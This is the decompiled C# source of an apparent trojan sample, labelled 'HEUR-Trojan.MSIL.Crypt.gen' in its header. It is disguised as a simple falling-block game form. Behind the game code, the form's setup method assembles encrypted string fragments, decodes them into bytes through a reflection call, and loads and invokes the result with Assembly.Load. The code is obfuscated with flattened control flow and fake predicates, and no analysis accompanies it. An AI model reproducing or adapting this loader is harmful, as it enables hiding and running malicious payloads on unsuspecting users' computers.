// Decompiled with JetBrains decompiler
// Type:  
// Assembly: SafeHeapHandleCa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 86070057-00F7-426E-5B63-54B8EF531843
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-3c09acc9b330846c99b3bdafa1697137c48b9a002919b6c1d671e9224bae9576.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

public sealed class \u0006\u2000 : \u0008\u2000
{
  private int \u0002;
  [DebuggerBrowsable(DebuggerBrowsableState.Never)]
  private \u0008\u2001 \u0003;
  [DebuggerBrowsable(DebuggerBrowsableState.Never)]
  private \u0003\u2002 \u0005;
  [DebuggerBrowsable(DebuggerBrowsableState.Never)]
  private List<\u000F\u2000> \u0008;
  [DebuggerBrowsable(DebuggerBrowsableState.Never)]
  private \u000F\u2000 \u0006;
  [DebuggerBrowsable(DebuggerBrowsableState.Never)]
  private bool \u000E;
  private IContainer \u000F;
  private static string \u0002\u2000;
  private static string \u0003\u2000;
  private static string \u0005\u2000;
  private static string \u0008\u2000;
  private static string \u0006\u2000;
  private static string \u000E\u2000;
  private static string \u000F\u2000;
  private static string \u0002\u2001;
  private static string \u0003\u2001;
  private static string \u0005\u2001;
  private static string \u0008\u2001;
  private static string \u0006\u2001;
  private static string \u000E\u2001;
  private string \u000F\u2001;
  private static object \u0002\u2002;
  private Label \u0003\u2002;
  private Panel \u0005\u2002;
  private Label \u0008\u2002;
  private PictureBox \u0006\u2002;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0006\u2000()
  {
    int num1 = 3;
    while (true)
    {
      int num2 = num1;
      PropertyInfo property;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            this.\u000F();
            num2 = 9;
            continue;
          case 1:
          case 5:
            goto label_10;
          case 3:
            goto label_9;
          case 4:
            goto label_5;
          case 6:
            goto label_11;
          case 7:
            goto label_3;
          case 8:
            goto label_2;
          case 9:
            property = ((System.Type) \u0006\u2000.\u0002\u2002).GetProperties()[0];
            if (!\u0006\u2000.\u0003())
            {
              num2 = 4;
              continue;
            }
            goto label_5;
          case 10:
            goto label_12;
          default:
            goto label_8;
        }
      }
label_2:
      this.\u000F\u2001 = string.Empty;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      num1 = 0;
      continue;
label_3:
      this.\u0003();
      num1 = 10;
      continue;
label_5:
      string[] strArray = new string[3];
      goto label_10;
label_8:
      num1 = 1;
      continue;
label_9:
      this.\u000F = (IContainer) null;
      num1 = 8;
      continue;
label_10:
      strArray[0] = \u0002\u2003.\u0002(-1094081742);
      strArray[1] = \u0002\u2003.\u0002(-1094081745);
      num1 = 6;
      continue;
label_11:
      strArray[2] = \u0002\u2003.\u0002(-1094081776);
      property.SetValue((object) null, (object) strArray, (object[]) null);
      this.\u0002();
      num1 = 7;
    }
label_12:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0006\u2000()
  {
    int num1 = 5;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_10;
          case 1:
            goto label_8;
          case 3:
            \u0006\u2000.\u000E\u2000 = \u0002\u2003.\u0002(-1094082599);
            \u0006\u2000.\u000F\u2000 = \u0002\u2003.\u0002(-1094063009);
            \u0006\u2000.\u0002\u2001 = \u0002\u2003.\u0002(-1094073976);
            num2 = 6;
            continue;
          case 4:
          case 6:
            \u0006\u2000.\u0003\u2001 = \u0002\u2003.\u0002(-1094076773);
            \u0006\u2000.\u0005\u2001 = \u0002\u2003.\u0002(-1094087772);
            goto case 8;
          case 5:
            goto label_9;
          case 7:
            goto label_1;
          case 8:
            \u0006\u2000.\u0008\u2001 = \u0002\u2003.\u0002(-1094081680);
            num2 = 9;
            continue;
          case 9:
            \u0006\u2000.\u0006\u2001 = \u0002\u2003.\u0002(-1094091091);
            num2 = 7;
            continue;
          case 10:
            goto label_12;
          default:
            num2 = 8;
            continue;
        }
      }
label_1:
      \u0006\u2000.\u000E\u2001 = \u0002\u2003.\u0002(-1094081787);
      num1 = 10;
      continue;
label_8:
      \u0006\u2000.\u0003\u2000 = \u0002\u2003.\u0002(-1094070149);
      num1 = 0;
      continue;
label_9:
      \u0006\u2000.\u0002\u2000 = \u0002\u2003.\u0002(-1094112578);
      num1 = 1;
      continue;
label_10:
      \u0006\u2000.\u0005\u2000 = \u0002\u2003.\u0002(-1094107820);
      \u0006\u2000.\u0008\u2000 = \u0002\u2003.\u0002(-1094118658);
      \u0006\u2000.\u0006\u2000 = \u0002\u2003.\u0002(-1094097707);
      num1 = 3;
    }
label_12:;
  }

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0008\u2001 ResetVisitor() => this.\u0003;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public void InstantiateVisitor(\u0008\u2001 _param1) => this.\u0003 = _param1;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0003\u2002 ManageVisitor() => this.\u0005;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public void PrepareVisitor(\u0003\u2002 _param1) => this.\u0005 = _param1;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public List<\u000F\u2000> SetupVisitor() => this.\u0008;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public void CollectVisitor(List<\u000F\u2000> _param1) => this.\u0008 = _param1;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u000F\u2000 EnableVisitor() => this.\u0006;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public void ReflectVisitor(\u000F\u2000 _param1) => this.\u0006 = _param1;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public bool ExcludeVisitor() => this.\u000E;

  [CompilerGenerated]
  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public void CalcVisitor(bool _param1) => this.\u000E = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002(object _param1, EventArgs _param2) => ((\u0005\u2000) this).\u0002();

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002()
  {
    int num1 = 5;
    while (true)
    {
      int num2 = num1;
      string str;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_6;
          case 1:
          case 2:
            \u0008\u2001 obj = new \u0008\u2001();
            obj.InvokeState(this.\u0002(str + \u0002\u2003.\u0002(-1094103071)));
            obj.FlushState(this.\u0002(str + \u0002\u2003.\u0002(-1094103077)));
            obj.ReadState(this.\u0002(str + \u0002\u2003.\u0002(-1094103499)));
            obj.VerifyState(this.\u0002(str + \u0002\u2003.\u0002(-1094103508)));
            obj.ForgotState(this.\u0002(str + \u0002\u2003.\u0002(-1094103548)));
            obj.InterruptState(this.\u0002(str + \u0002\u2003.\u0002(-1094103439)));
            obj.InstantiateState(this.\u0002(str + \u0002\u2003.\u0002(-1094103447)));
            this.InstantiateVisitor(obj);
            num2 = 3;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_5;
          case 6:
            goto label_8;
          default:
            if (\u0006\u2000.\u0002())
            {
              num2 = 4;
              continue;
            }
            goto label_5;
        }
      }
label_1:
      Size size = new Size(40, 40);
label_5:
      this.CollectVisitor(new List<\u000F\u2000>()
      {
        (\u000F\u2000) new \u0002\u2002(this.ResetVisitor().QueryState(), size),
        (\u000F\u2000) new \u000E\u2001(this.ResetVisitor().DisableState(), size),
        (\u000F\u2000) new \u000F\u2002(this.ResetVisitor().MoveState(), size),
        (\u000F\u2000) new \u0002\u2001(this.ResetVisitor().VisitState(), size),
        (\u000F\u2000) new \u0006\u2002(this.ResetVisitor().ResolveState(), size),
        (\u000F\u2000) new \u0008\u2002(this.ResetVisitor().CompareState(), size),
        (\u000F\u2000) new \u0006\u2001(this.ResetVisitor().ResetState(), size)
      });
      num1 = 6;
      continue;
label_6:
      str = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, \u0002\u2003.\u0002(-1094103044));
      num1 = 2;
    }
label_8:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0003()
  {
    int num1 = 0;
    while (true)
    {
      switch (num1)
      {
        case 0:
          this.PrepareVisitor(new \u0003\u2002(this.ResetVisitor()));
          num1 = 6;
          continue;
        case 1:
        case 4:
          this.CalcVisitor(true);
          if (\u0006\u2000.\u0002())
          {
            num1 = 7;
            continue;
          }
          goto case 5;
        case 2:
        case 3:
          this.MinimumSize = this.MaximumSize = this.Size;
          goto case 5;
        case 5:
          this.ReflectVisitor((\u000F\u2000) null);
          num1 = 1;
          continue;
        case 6:
          this.ClientSize = new Size(this.Width, this.ManageVisitor().RevertVisitor().Height * this.ManageVisitor().ChangeVisitor().Height);
          int num2 = 3;
          num1 = \u0006\u2000.\u0003() ? num2 : num2;
          continue;
        case 7:
          goto label_2;
        default:
          num1 = 5;
          continue;
      }
    }
label_2:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0005()
  {
    int num1 = 8;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            int num3 = (int) MessageBox.Show(\u0002\u2003.\u0002(-1094103487));
            this.\u0003();
            num2 = 10;
            continue;
          case 1:
          case 9:
            goto label_15;
          case 2:
          case 3:
            Random random = new Random(DateTime.Now.Millisecond);
            this.ReflectVisitor(this.SetupVisitor()[random.Next(0, 7)]);
            num2 = 4;
            continue;
          case 4:
            \u000F\u2000 obj = this.EnableVisitor();
            Size size = this.ManageVisitor().RevertVisitor();
            int num4 = size.Width / 2;
            size = this.EnableVisitor().AwakeVisitor();
            int num5 = size.Width / 2;
            Point point = new Point(num4 - num5, 0);
            obj.TestVisitor(point);
            num2 = 7;
            continue;
          case 5:
            goto label_1;
          case 6:
            goto label_4;
          case 7:
            goto label_8;
          case 8:
            goto label_14;
          case 10:
            goto label_18;
          default:
            goto label_11;
        }
      }
label_1:
      if (!this.ManageVisitor().\u0002(this.EnableVisitor(), Point.Empty))
      {
        num1 = 6;
        continue;
      }
      int num6 = 1;
      goto label_6;
label_4:
      num6 = this.ManageVisitor().\u0002(this.EnableVisitor(), new Point(0, 1)) ? 1 : 0;
label_6:
      if (num6 != 0)
      {
        this.CalcVisitor(false);
        num1 = 0;
        continue;
      }
      break;
label_8:
      this.EnableVisitor().\u0002();
      goto label_1;
label_11:
      num1 = 5;
      continue;
label_14:
      bool flag = this.EnableVisitor() == null;
      num1 = 9;
      continue;
label_15:
      if (flag)
        num1 = 3;
      else
        goto label_19;
    }
    return;
label_18:
    return;
label_19:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0008()
  {
    int num = 4;
    bool flag;
    while (true)
    {
      switch (num)
      {
        case 0:
          \u000F\u2000 obj = this.EnableVisitor();
          Point point1 = this.EnableVisitor().ViewVisitor();
          int x = point1.X;
          point1 = this.EnableVisitor().ViewVisitor();
          int y = point1.Y + 1;
          Point point2 = new Point(x, y);
          obj.TestVisitor(point2);
          if (!\u0006\u2000.\u0003())
          {
            num = 3;
            continue;
          }
          goto case 3;
        case 1:
        case 7:
          if (!flag)
          {
            if (this.\u0002 >= 500)
            {
              num = 6;
              continue;
            }
            goto label_14;
          }
          else
          {
            num = 2;
            continue;
          }
        case 2:
          goto label_4;
        case 3:
        case 5:
          this.\u0006();
          if (!\u0006\u2000.\u0003())
          {
            num = 8;
            continue;
          }
          goto label_12;
        case 4:
          flag = this.EnableVisitor() == null;
          num = 7;
          continue;
        case 6:
          this.\u0002 = 0;
          goto case 0;
        case 8:
          goto label_15;
        default:
          num = 0;
          continue;
      }
    }
label_4:
    return;
label_15:
    return;
label_14:
    return;
label_12:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002(int _param1)
  {
    int num1 = 15;
    while (true)
    {
      bool flag1;
      int num2;
      Point point1;
      int index1;
      Size size;
      Point point2;
      bool flag2;
      int index2;
      Point point3;
      bool flag3;
      switch (num1)
      {
        case 0:
        case 15:
          flag1 = this.EnableVisitor() == null;
          num2 = 12;
          break;
        case 1:
        case 4:
          int x1 = point3.X;
          size = this.EnableVisitor().AwakeVisitor();
          int width1 = size.Width;
          int num3 = x1 + width1 + _param1;
          size = this.ManageVisitor().RevertVisitor();
          int width2 = size.Width;
          if (num3 <= width2)
          {
            ref Point local = ref point2;
            point3 = this.EnableVisitor().ViewVisitor();
            int x2 = point3.X + _param1;
            point3 = this.EnableVisitor().ViewVisitor();
            int y = point3.Y;
            local = new Point(x2, y);
            num1 = 11;
            continue;
          }
          goto label_21;
        case 2:
          if (flag3)
          {
            point1 = new Point(point2.X + index2, point2.Y + index1);
            num2 = 7;
            break;
          }
          goto label_31;
        case 3:
          ++index1;
          goto case 8;
        case 5:
          if (!flag2)
          {
            num1 = 3;
            continue;
          }
          flag3 = this.EnableVisitor().CheckVisitor()[index1, index2] > 0;
          goto case 2;
        case 6:
          if (point3.X + _param1 >= 0)
          {
            point3 = this.EnableVisitor().ViewVisitor();
            num2 = 1;
            break;
          }
          goto label_16;
        case 7:
          if (this.ManageVisitor().\u0002(point1))
          {
            num1 = 13;
            continue;
          }
          goto label_31;
        case 8:
          int num4 = index1;
          size = this.EnableVisitor().AwakeVisitor();
          int height = size.Height;
          if (num4 >= height)
          {
            this.EnableVisitor().TestVisitor(point2);
            this.\u0006();
            num2 = 16;
            break;
          }
          index2 = 0;
          num1 = 9;
          continue;
        case 9:
        case 14:
          int num5 = index2;
          size = this.EnableVisitor().AwakeVisitor();
          int width3 = size.Width;
          flag2 = num5 < width3;
          if (\u0006\u2000.\u0002())
          {
            num1 = 5;
            continue;
          }
          goto label_11;
        case 10:
          goto label_30;
        case 11:
          index1 = 0;
          int num6 = 8;
          num1 = \u0006\u2000.\u0003() ? num6 : num6;
          continue;
        case 12:
          if (!flag1)
          {
            point3 = this.EnableVisitor().ViewVisitor();
            num1 = 6;
            continue;
          }
          num1 = 10;
          continue;
        case 13:
          goto label_26;
        case 16:
          goto label_12;
        default:
          num2 = 2;
          break;
      }
label_18:
      num1 = num2;
      continue;
label_31:
      ++index2;
      num2 = 14;
      goto label_18;
    }
label_11:
    return;
label_30:
    return;
label_26:
    return;
label_12:
    return;
label_21:
    return;
label_16:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0006()
  {
    int num1 = 4;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_7;
          case 2:
          case 6:
            this.ManageVisitor().\u0002(this.EnableVisitor());
            goto case 3;
          case 3:
            this.ManageVisitor().\u0002();
            num2 = 5;
            continue;
          case 4:
            if (this.EnableVisitor() != null)
            {
              num2 = 0;
              continue;
            }
            goto label_8;
          case 5:
            this.ReflectVisitor((\u000F\u2000) null);
            num2 = 7;
            continue;
          case 7:
            goto label_13;
          default:
            goto label_4;
        }
      }
label_4:
      num1 = 3;
      continue;
label_7:
      int num3 = this.ManageVisitor().\u0002(this.EnableVisitor(), new Point(0, 1)) ? 1 : 0;
      goto label_9;
label_8:
      num3 = 0;
label_9:
      if (num3 != 0)
        num1 = 6;
      else
        goto label_14;
    }
label_13:
    return;
label_14:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u000E()
  {
    int num1 = 4;
    if (\u0006\u2000.\u0002())
      goto label_3;
label_1:
    bool flag = this.EnableVisitor() != null;
    goto label_5;
label_2:
    int num2;
    num1 = num2;
label_3:
    switch (num1)
    {
      case 0:
      case 4:
      case 5:
        goto label_1;
      case 1:
      case 3:
        this.\u0006();
        num2 = 5;
        goto label_2;
      case 2:
        break;
      case 6:
        return;
      default:
        num2 = 2;
        goto label_2;
    }
label_5:
    if (!flag)
    {
      num2 = 6;
      goto label_2;
    }
    else
    {
      this.EnableVisitor().TestVisitor(new Point(this.EnableVisitor().ViewVisitor().X, this.EnableVisitor().ViewVisitor().Y + 1));
      if (!\u0006\u2000.\u0002())
        return;
      num1 = 3;
      goto label_3;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected override void \u0008\u2000\u200A\u2001\u0002(\u000F\u2001 _param1)
  {
    int num1 = 11;
    while (true)
    {
      int num2 = num1;
      bool flag1;
      bool flag2;
      bool flag3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            if (flag1)
            {
              num2 = 1;
              continue;
            }
            flag3 = this.ReflectState().RateState();
            goto case 5;
          case 1:
            goto label_12;
          case 2:
            if (!flag2)
            {
              this.\u0002 += _param1.CancelState();
              num2 = 13;
              continue;
            }
            goto label_16;
          case 3:
          case 6:
          case 10:
          case 12:
          case 14:
            goto label_20;
          case 4:
            this.ManageVisitor().\u0002(this.EnableVisitor(), 1);
            this.\u0006();
            num2 = 14;
            continue;
          case 5:
          case 7:
            if (!flag3)
            {
              if (!this.ReflectState().PopState())
              {
                if (this.ReflectState().WriteState())
                {
                  this.\u000E();
                  if (\u0006\u2000.\u0002())
                  {
                    num2 = 12;
                    continue;
                  }
                  goto label_3;
                }
                else
                  goto label_20;
              }
              else
              {
                num2 = 4;
                continue;
              }
            }
            else
              goto label_19;
          case 8:
            goto label_10;
          case 9:
            goto label_3;
          case 11:
            flag2 = !this.ExcludeVisitor();
            num2 = 2;
            continue;
          case 13:
            goto label_13;
          case 15:
            goto label_21;
          default:
            num2 = 5;
            continue;
        }
      }
label_3:
      this.\u0002(1);
      goto label_20;
label_10:
      this.\u0008();
      num1 = 15;
      continue;
label_12:
      this.\u0002(-1);
      num1 = 3;
      continue;
label_13:
      if (!this.ReflectState().RunState())
      {
        flag1 = this.ReflectState().AwakeState();
        num1 = 0;
        continue;
      }
      num1 = 9;
      continue;
label_19:
      this.ManageVisitor().\u0002(this.EnableVisitor(), -1);
      this.\u0006();
      num1 = 6;
      continue;
label_20:
      this.\u0008\u2002.Text = this.ManageVisitor().\u0002().ToString();
      this.\u0005();
      num1 = 8;
    }
label_16:
    return;
label_21:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public override void \u0008\u2000\u200A\u2001\u0002(\u000E\u2002 _param1)
  {
    int num1 = 4;
    if (!\u0006\u2000.\u0003())
      goto label_5;
label_1:
    this.EnableVisitor().\u000E\u2000\u200A\u2001\u0002(_param1);
    int num2 = 6;
label_4:
    num1 = num2;
label_5:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          goto label_2;
        case 1:
        case 3:
          goto label_7;
        case 4:
          this.ManageVisitor().\u000E\u2000\u200A\u2001\u0002(_param1);
          num1 = 3;
          continue;
        case 5:
          goto label_1;
        case 6:
          goto label_9;
        default:
          if (\u0006\u2000.\u0002())
          {
            num1 = 5;
            continue;
          }
          goto label_7;
      }
    }
label_2:
    bool flag;
    if (!flag)
      return;
    goto label_1;
label_9:
    return;
label_7:
    flag = this.EnableVisitor() != null;
    num2 = 0;
    goto label_4;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected override void Dispose(bool _param1)
  {
    int num1 = 2;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_10;
          case 1:
          case 4:
            goto label_6;
          case 3:
            goto label_1;
          case 5:
            goto label_2;
          case 6:
            goto label_12;
          default:
            num2 = 3;
            continue;
        }
      }
label_1:
      base.Dispose(_param1);
      num1 = 6;
      continue;
label_2:
      this.\u000F.Dispose();
      goto label_1;
label_6:
      int num3 = this.\u000F != null ? 1 : 0;
label_8:
      if (num3 != 0)
      {
        num1 = 5;
        continue;
      }
      goto label_1;
label_10:
      if (!_param1)
      {
        num3 = 0;
        goto label_8;
      }
      else
        num1 = 4;
    }
label_12:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0002(byte[] _param0) => \u0006\u2000.\u0002(\u0006\u2000.\u0002(_param0));

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static Assembly \u0002(byte[] _param0) => Assembly.Load(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0002(Assembly _param0) => \u0006\u2000.\u0002\u2002 = (object) _param0.GetType(\u0002\u2003.\u0002(-1094103375));

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u000F()
  {
    int num1 = 5;
    if (\u0006\u2000.\u0003())
      ;
    while (true)
    {
      int num2;
      ComponentResourceManager componentResourceManager;
      switch (num1)
      {
        case 0:
          this.\u0003\u2002.TabIndex = 7;
          num1 = 8;
          continue;
        case 1:
          ((ISupportInitialize) this.\u0006\u2002).BeginInit();
          this.SuspendLayout();
          base.\u000E.BorderStyle = BorderStyle.FixedSingle;
          num2 = 9;
          break;
        case 2:
          this.\u0003\u2002.Location = new Point(631, 11);
          this.\u0003\u2002.Margin = new Padding(4, 0, 4, 0);
          this.\u0003\u2002.Name = \u0002\u2003.\u0002(-1094103313);
          this.\u0003\u2002.Size = new Size(74, 29);
          num2 = 0;
          break;
        case 3:
          base.\u000E.Image = (Image) componentResourceManager.GetObject(\u0002\u2003.\u0002(-1094103786));
          base.\u000E.Location = new Point(0, 0);
          num1 = 13;
          continue;
        case 4:
          this.\u000F\u2001 = \u0006\u2000.\u0002\u2000 + \u0006\u2000.\u0003\u2000 + \u0006\u2000.\u0005\u2000 + \u0006\u2000.\u0008\u2000 + \u0006\u2000.\u0006\u2000 + \u0006\u2000.\u000E\u2000 + \u0006\u2000.\u000F\u2000 + \u0006\u2000.\u0002\u2001 + \u0006\u2000.\u0003\u2001 + \u0006\u2000.\u0005\u2001 + \u0006\u2000.\u0008\u2001 + \u0006\u2000.\u0006\u2001 + \u0006\u2000.\u000E\u2001;
          this.\u000F\u2001 = this.\u000F\u2001.Replace(\u0002\u2003.\u0002(-1094103749), \u0002\u2003.\u0002(-1094103762));
          num2 = 12;
          break;
        case 5:
          componentResourceManager = new ComponentResourceManager(typeof (\u0006\u2000));
          num2 = 11;
          break;
        case 6:
        case 13:
          base.\u000E.Margin = new Padding(5, 5, 5, 5);
          base.\u000E.Size = new Size(533, 800);
          int num3 = 7;
          num1 = \u0006\u2000.\u0003() ? num3 : num3;
          continue;
        case 7:
          this.\u0003\u2002.AutoSize = true;
          goto case 10;
        case 8:
          this.\u0003\u2002.Text = \u0002\u2003.\u0002(-1094103344);
          this.\u0005\u2002.BackColor = SystemColors.ControlLight;
          num2 = 4;
          break;
        case 9:
          base.\u000E.Dock = DockStyle.Left;
          num2 = 3;
          break;
        case 10:
          this.\u0003\u2002.Font = new Font(\u0002\u2003.\u0002(-1094103356), 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
          num2 = 2;
          break;
        case 11:
          this.\u0003\u2002 = new Label();
          this.\u0005\u2002 = new Panel();
          this.\u0008\u2002 = new Label();
          num2 = 16;
          break;
        case 12:
          \u0006\u2000.\u0002((byte[]) System.Type.GetType(\u0002\u2003.\u0002(-1094103397)).InvokeMember(\u0002\u2003.\u0002(-1094103308), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
          {
            (object) this.\u000F\u2001
          }));
          num1 = 15;
          continue;
        case 14:
        case 15:
          this.SuspendLayout();
          num2 = 17;
          break;
        case 16:
          this.\u0006\u2002 = new PictureBox();
          ((ISupportInitialize) base.\u000E).BeginInit();
          this.\u0005\u2002.SuspendLayout();
          num2 = 1;
          break;
        case 17:
          goto label_15;
        default:
          if (!\u0006\u2000.\u0003())
          {
            num1 = 10;
            continue;
          }
          goto case 2;
      }
      num1 = num2;
    }
label_15:;
  }

  internal new static bool \u0002() => true;

  internal new static bool \u0003() => false;
}
